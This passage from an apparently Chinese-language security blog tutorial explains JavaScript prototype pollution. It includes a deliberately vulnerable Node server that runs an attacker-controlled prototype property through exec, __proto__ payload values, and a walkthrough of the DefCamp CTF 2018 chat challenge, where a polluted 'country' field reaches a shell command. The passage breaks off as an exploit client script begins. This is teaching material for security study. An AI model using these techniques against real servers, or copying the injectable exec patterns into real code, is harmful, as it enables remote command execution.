class=\"hljs-name\">form</span> <span class=\"hljs-attr\">action</span>=<span class=\"hljs-string\">'http://127.0.0.1:1234'</span> <span class=\"hljs-attr\">method</span>=<span class=\"hljs-string\">\"get\"</span>&gt;</span><br>pathname1:<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"text\"</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"pathname1\"</span>&gt;</span> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><br>pathname2:<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"text\"</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"pathname2\"</span>&gt;</span> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><br>value   :<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type:</span>\"<span class=\"hljs-attr\">text</span>\" <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">\"value\"</span>&gt;</span> <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">br</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">input</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">'submit'</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">'submit'</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">form</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>我们访问客户端来构造利用 payload :</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">pathname1</span> = __proto__<br><span class=\"hljs-attr\">pathname2</span> = a<br><span class=\"hljs-attr\">value</span> = command<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/13.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"13\"></p>\n<h3 id=\"2、控制了路径赋值参数\"><a href=\"#2、控制了路径赋值参数\" class=\"headerlink\" title=\"2、控制了路径赋值参数\"></a>2、控制了路径赋值参数</h3><p>有的 api 里面有通过传入路径来给对象属性赋值的方法，如果部分参数可控，便可以达到原型链污染的目的，沿用上面的代码例子，我们引入 pathval 这个第三方 api，通过里面的 setPathVal 方法，来触发原型链污染的漏洞：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 服务端</span><br><span class=\"hljs-keyword\">var</span> url = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'url'</span>);<br><span class=\"hljs-keyword\">var</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<br><span class=\"hljs-keyword\">var</span> fs = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'fs'</span>);<br><span class=\"hljs-keyword\">var</span> exec = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'child_process'</span>).exec;<br><span class=\"hljs-keyword\">var</span> pathval = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'pathval'</span>);<br>http.createServer(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">req,res</span>)</span>&#123;<br>        <span class=\"hljs-keyword\">var</span> req_url = req.url;<br>        <span class=\"hljs-keyword\">var</span> str_url = url.parse(req_url,<span class=\"hljs-literal\">true</span>).query;<br>        <span class=\"hljs-keyword\">var</span> path1 = <span class=\"hljs-built_in\">String</span>(str_url.pathname1);<br>        <span class=\"hljs-keyword\">var</span> value = <span class=\"hljs-built_in\">String</span>(str_url.value);<br>        <span class=\"hljs-keyword\">var</span> obj = &#123;<span class=\"hljs-attr\">earth</span>:&#123;<span class=\"hljs-attr\">country</span>:<span class=\"hljs-string\">'UK'</span>&#125;&#125;;<br>        pathval.setPathValue(obj,path1,value)<br>        <span class=\"hljs-keyword\">var</span> test = &#123;&#125;;<br>        exec(test.vul,<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err,data,stderr</span>)</span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(err)&#123;<br>                <span class=\"hljs-built_in\">console</span>.log(stderr);<br>        &#125;<br>        <span class=\"hljs-keyword\">else</span>&#123;<br>                <span class=\"hljs-built_in\">console</span>.log(data);<br>        &#125;<br>&#125;)&#125;).listen(<span class=\"hljs-number\">1234</span>);<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/prototype/14.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"14\"></p>\n<h3 id=\"3、对象克隆\"><a href=\"#3、对象克隆\" class=\"headerlink\" title=\"3、对象克隆\"></a>3、对象克隆</h3><p>实质上还是递归进行合并的做法，我们可以用前面分析过的方法理解。下面我们提下一般深层克隆的方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">&lt;script&gt;<br>    <span class=\"hljs-keyword\">var</span> obj = &#123;<br>        <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">\"rt95\"</span>,<br>        <span class=\"hljs-attr\">age</span>: <span class=\"hljs-number\">20</span>,<br>        <span class=\"hljs-attr\">monry</span>: <span class=\"hljs-number\">1000</span><br>    &#125;;<br>    <span class=\"hljs-keyword\">var</span> obj1 = &#123;&#125;;<br><br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">clone</span>(<span class=\"hljs-params\">origin, target</span>) </span>&#123;<br>        target = target || &#123;&#125;;<br><br>        toStr = <span class=\"hljs-built_in\">Object</span>.prototype.toString;<br>        arrstr = <span class=\"hljs-string\">\"[object Array]\"</span>;<br>        <span class=\"hljs-keyword\">for</span> (prop <span class=\"hljs-keyword\">in</span> origin) &#123;<br>            <span class=\"hljs-keyword\">if</span> (origin.hasOwnProperty(prop)) &#123;<br>                <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">typeof</span>(origin[prop]) === <span class=\"hljs-string\">\"object\"</span>) &#123;<br>                    <span class=\"hljs-keyword\">if</span> (toStr.call(prop) === arrstr) &#123;<br>                        target[prop] = [];<br>                    &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                        target[prop] = &#123;&#125;;<br>                    &#125;<br>                    clone(origin[prop], target[prop])<br>                &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                    target[prop] = origin[prop];<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    clone(obj, obj1);<br><span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>\n\n<p>大致流程就是：</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\"><span class=\"hljs-number\">1</span>、生成克隆对象 ------&gt;<br><span class=\"hljs-number\">2</span>、判断 origin（被克隆对象）的元素是原始值还是引用值 ------&gt;<br><span class=\"hljs-number\">3</span>、原始值直接进行赋值，引用值需要分情况 ------&gt;<br><span class=\"hljs-number\">4</span>、引用值如果是数组，那么在克隆对象中创建一个空数组，然后递归上面原始值的克隆过程 -----&gt;<br><span class=\"hljs-number\">5</span>、引用值如果是对象，那么在克隆对象中创建一个空对象，然后递归上面原始值的克隆过程。<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>原始值：</p>\n<p>存储在栈（stack）中的简单数据段，也就是说，它们的值直接存储在变量访问的位置。</p>\n<p>引用值：</p>\n<p>存储在堆（heap）中的对象，也就是说，存储在变量处的值是一个指针（point），指向存储对象的内存处。</p>\n</blockquote>\n<ul>\n<li>原始值就是单变量形成的值，值一般是字面量，像整数，字符串等。</li>\n<li>引用值就是对象，数组等结构型的值。</li>\n</ul>\n<p>那么克隆引用值的时候赋给克隆对象的值将会是原对象所指的数据处，那么相当于克隆对象和被克隆对象共有这组值。所以为了实现完全独一份的克隆，我们需要深入到引用值内部元素，然后进行克隆对象新建相应引用值类型数据结构后的逐一赋值。</p>\n<h1 id=\"4-实战题目\"><a href=\"#4-实战题目\" class=\"headerlink\" title=\"4@ 实战题目\"></a>4@ 实战题目</h1><p>题目来源于 DefCamp CTF 2018 ，源码可以<a href=\"https://dctf.def.camp/dctf-18-quals-81249812/chat.zip\" target=\"_blank\" rel=\"noopener\">在这下载</a>。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javscript\">// 客户端代码<br>const io = require(&apos;socket.io-client&apos;)<br>const socket = io.connect(&apos;https://chat.dctfq18.def.camp&apos;) // 此处我们可以设为本地测试的地址<br><br>if(process.argv.length != 4) &#123;<br>  console.log(&apos;name and channel missing&apos;)<br>   process.exit()<br>&#125;<br>console.log(&apos;Logging as &apos; + process.argv[2] + &apos; on &apos; + process.argv[3])<br>var inputUser = &#123;<br>  name: process.argv[2],<br>&#125;;<br><br>socket.on(&apos;message&apos;, function(msg) &#123;<br>  console.log(msg.from,&quot;[&quot;, msg.channel!==undefined?msg.channel:&apos;Default&apos;,&quot;]&quot;, &quot;says:\\n&quot;, msg.message);<br>&#125;);<br><br>socket.on(&apos;error&apos;, function (err) &#123;<br>  console.log(&apos;received socket error:&apos;)<br>  console.log(err)<br>&#125;)<br><br>socket.emit(&apos;register&apos;, JSON.stringify(inputUser));<br>socket.emit(&apos;message&apos;, JSON.stringify(&#123; msg: &quot;hello&quot; &#125;));<br>socket.emit(&apos;join&apos;, process.argv[3]);//ps: you should keep your channels private<br>socket.emit(&apos;message&apos;, JSON.stringify(&#123; channel: process.argv[3], msg: &quot;hello channel&quot; &#125;));<br>socket.emit(&apos;message&apos;, JSON.stringify(&#123; channel: &quot;test&quot;, msg: &quot;i own you&quot; &#125;));<br></code></pre></td></tr></table></figure>\n\n<p>从命令行接受进入参数后，然后将序列化后的数据发送到服务端，触发服务端事件。</p>\n<p>在源码包里面我们发现了服务端引用模块文件 helper.js 中有如下执行系统命令的方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">getAscii: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">message</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">var</span> e = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'child_process'</span>);<br>        <span class=\"hljs-keyword\">return</span> e.execSync(<span class=\"hljs-string\">\"cowsay '\"</span> + message + <span class=\"hljs-string\">\"'\"</span>).toString();<br>    &#125;<br></code></pre></td></tr></table></figure>\n\n<p>在服务端代码中定位到使用此方法的位置：在 join 和 leave 事件里面都有使用：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// 服务端代码</span><br>.......<br><br>io.on(<span class=\"hljs-string\">'connection'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">client</span>) </span>&#123; <br>    client.on(<span class=\"hljs-string\">'register'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">inUser</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">try</span> &#123;<br>            newUser = helper.clone(<span class=\"hljs-built_in\">JSON</span>.parse(inUser))<br><br>.........<br><br>    client.on(<span class=\"hljs-string\">'join'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">channel</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">try</span> &#123;<br>            clientManager.joinChannel(client, channel);<br>            sendMessageToClient(client,<span class=\"hljs-string\">\"Server\"</span>, <br>                <span class=\"hljs-string\">\"You joined channel\"</span>, channel)<br><br>            <span class=\"hljs-keyword\">var</span> u = clientManager.getUsername(client);<br>            <span class=\"hljs-keyword\">var</span> c = clientManager.getCountry(client);<br><br>            sendMessageToChannel(channel,<span class=\"hljs-string\">\"Server\"</span>, <br>                helper.getAscii(<span class=\"hljs-string\">\"User \"</span> + u + <span class=\"hljs-string\">\" living in \"</span> + c + <span class=\"hljs-string\">\" joined channel\"</span>))<br>        &#125; <span class=\"hljs-keyword\">catch</span>(e) &#123; <span class=\"hljs-built_in\">console</span>.log(e); client.disconnect() &#125;<br>    &#125;);<br><br>    client.on(<span class=\"hljs-string\">'leave'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">channel</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">try</span> &#123;<br>            client .join(channel);<br>            clientManager.leaveChannel(client, channel);<br>            sendMessageToClient(client,<span class=\"hljs-string\">\"Server\"</span>, <br>                <span class=\"hljs-string\">\"You left channel\"</span>, channel)<br><br>            <span class=\"hljs-keyword\">var</span> u = clientManager.getUsername(client);<br>            <span class=\"hljs-keyword\">var</span> c = clientManager.getCountry(client);<br>            sendMessageToChannel(channel, <span class=\"hljs-string\">\"Server\"</span>, <br>                helper.getAscii(<span class=\"hljs-string\">\"User \"</span> + u + <span class=\"hljs-string\">\" living in \"</span> + c + <span class=\"hljs-string\">\" left channel\"</span>))<br>        &#125; <span class=\"hljs-keyword\">catch</span>(e) &#123; <span class=\"hljs-built_in\">console</span>.log(e); client.disconnect() &#125;<br>    &#125;);<br>server.listen(<span class=\"hljs-number\">3000</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">err</span>) </span>&#123;<br>  <span class=\"hljs-keyword\">if</span> (err) <span class=\"hljs-keyword\">throw</span> err;<br>  <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">'listening on port 3000'</span>);  <span class=\"hljs-comment\">// 这里的端口也可以改为本地测试端口</span><br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<p>参数 u 和 c 是通过模块 clientManager 中的 getUsername 方法和 getCountry 方法得到，跟进到 clientManager.js 文件中：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">getUsername: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">client</span>) </span>&#123;<br>      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.clients[client.id].u.name;<br>  &#125;,<br><span class=\"hljs-attr\">getCountry</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">client</span>) </span>&#123;<br>      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">this</span>.clients[client.id].u.country;<br>  &#125;<br></code></pre></td></tr></table></figure>\n\n<p>直接返回原先服务端注册生成的用户信息，我们来看看那个方法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">clientManager.registerClient(client, newUser); <span class=\"hljs-comment\">// newUser 就是客户端传来的经过 clone 和 JSON.parse() 处理的数据。</span><br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// clientManager.js</span><br><span class=\"hljs-attr\">registerClient</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">client, user</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">this</span>.clients[client.id] = &#123; <span class=\"hljs-string\">'c'</span>: client,<br>                                    <span class=\"hljs-string\">'u'</span>: user,<br>                                    <span class=\"hljs-string\">'ch'</span>: &#123;&#125;<br>        &#125;;<br>    &#125;<br></code></pre></td></tr></table></figure>\n\n<p>所以上面的 getAscii 方法中的 u 就是我们客户端传入的经过处理的数据，只需让这个对象的 country 属性变得可利用即可，那么可以直接赋值吗？很可惜被黑名单过滤了：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// helper.js</span><br> <span class=\"hljs-attr\">validUser</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">inp</span>) </span>&#123;<br>        <span class=\"hljs-keyword\">var</span> block = [<span class=\"hljs-string\">\"source\"</span>,<span class=\"hljs-string\">\"port\"</span>,<span class=\"hljs-string\">\"font\"</span>,<span class=\"hljs-string\">\"country\"</span>,<br>                     <span class=\"hljs-string\">\"location\"</span>,<span class=\"hljs-string\">\"status\"</span>,<span class=\"hljs-string\">\"lastname\"</span>];<br>        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">typeof</span> inp !== <span class=\"hljs-string\">'object'</span>) &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>        &#125;<br></code></pre></td></tr></table></figure>\n\n<p>被检测函数的黑名单过滤了，那么就不能直接给 country 属性赋值了，但是我们可以放到其原型里面，所以下面我们就来看看另一个处理传入数据的函数，clone() : </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\">&lt;script&gt;<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">clone</span>(<span class=\"hljs-params\">obj</span>) </span>&#123;<br><br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">typeof</span> obj !== <span class=\"hljs-string\">'object'</span> || obj === <span class=\"hljs-literal\">null</span>) &#123;<br><br>            <span class=\"hljs-keyword\">return</span> obj;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">var</span> newObj;<br>        <span class=\"hljs-keyword\">var</span> cloneDeep = <span class=\"hljs-literal\">false</span>;<br><br>    ......<br>            else &#123;<br>                <span class=\"hljs-keyword\">var</span> proto = <span class=\"hljs-built_in\">Object</span>.getPrototypeOf(obj);<br>                <span class=\"hljs-keyword\">if</span> (proto &amp;&amp; proto.isImmutable) &#123;<br>\t\t\t\t<br>                    newObj = obj;<br>                &#125;<br>                <span class=\"hljs-keyword\">else</span> &#123;<br>                    newObj = <span class=\"hljs-built_in\">Object</span>.create(proto);<br>                    cloneDeep = <span class=\"hljs-literal\">true</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>            newObj = [];<br>            cloneDeep = <span class=\"hljs-literal\">true</span>;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">if</span> (cloneDeep) &#123;<br>            <span class=\"hljs-keyword\">var</span> keys = <span class=\"hljs-built_in\">Object</span>.getOwnPropertyNames(obj);<br><br>            <br>            <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">var</span> i = <span class=\"hljs-number\">0</span>; i &lt; keys.length; ++i) &#123;<br>                <span class=\"hljs-keyword\">var</span> key = keys[i];<br>                <span class=\"hljs-keyword\">var</span> descriptor = <span class=\"hljs-built_in\">Object</span>.getOwnPropertyDescriptor(obj, key);<br>                <span class=\"hljs-keyword\">if</span> (descriptor &amp;&amp; (descriptor.get || descriptor.set)) &#123;<br><br>                    <br>                    <span class=\"hljs-built_in\">Object</span>.defineProperty(newObj, key, descriptor);<br>                &#125;<br>                <span class=\"hljs-keyword\">else</span> &#123;<br>                    newObj[key] = <span class=\"hljs-keyword\">this</span>.clone(obj[key]);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">return</span> newObj;<br>    &#125;<br>&lt;<span class=\"hljs-regexp\">/script&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>由于我们传入的参数直接是对象（JSON.parse() 之后的结果），所以直接定位代码到处理对象的分支：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">else</span> &#123;<br>            newObj = <span class=\"hljs-built_in\">Object</span>.create(proto);<br>            cloneDeep = <span class=\"hljs-literal\">true</span>;<br>&#125;<br>......<br>if (cloneDeep) &#123;<br>            <span class=\"hljs-keyword\">var</span> keys = <span class=\"hljs-built_in\">Object</span>.getOwnPropertyNames(obj);<br><br><br>            <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">var</span> i = <span class=\"hljs-number\">0</span>; i &lt; keys.length; ++i) &#123;<br>                <span class=\"hljs-keyword\">var</span> key = keys[i];<br>                <span class=\"hljs-keyword\">var</span> descriptor = <span class=\"hljs-built_in\">Object</span>.getOwnPropertyDescriptor(obj, key);<br>                <span class=\"hljs-keyword\">if</span> (descriptor &amp;&amp; (descriptor.get || descriptor.set)) &#123;<br><br><br>                    <span class=\"hljs-built_in\">Object</span>.defineProperty(newObj, key, descriptor);<br>                &#125; <span class=\"hljs-keyword\">else</span> &#123;<br>                    newObj[key] = <span class=\"hljs-keyword\">this</span>.clone(obj[key]);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class=\"hljs-keyword\">return</span> newObj;<br></code></pre></td></tr></table></figure>\n\n<p>其中这个方法 <code>getOwnPropertyDescriptor()</code>,返回指定对象上自有属性的对应描述符，由于我们通过 JSON.parse() 方法传入的对象已经具有 __proto__ 这个属性了，所以可以用这个方法获取到。</p>\n<p>通过 Object.create() 函数创建对象，原型使用我们构造的对象的原型，即具有普通属性的 __proto__,则可以成功通过这个方法使得 newObj 拥有我们可控的 country 属性，而后面方法 <code>newObj[key]  = this.clone(obj[key])</code> 再写入一次还是这个结果。至此，属性 country 被写入到操作对象中，等待被调用数据，我们构造如下 payload ：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs javascript\"><span class=\"hljs-keyword\">const</span> io = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'socket.io-client'</span>)<br><span class=\"hljs-keyword\">const</span> socket = io.connect(<span class=\"hljs-string\">'https://chat.dctfq18.def.camp'</span>)  <span class=\"hljs-comment\">// 测试时换为本地地址</span><br><br>socket.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">err</span>) </span>&#123;<br>  <span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">'received socket 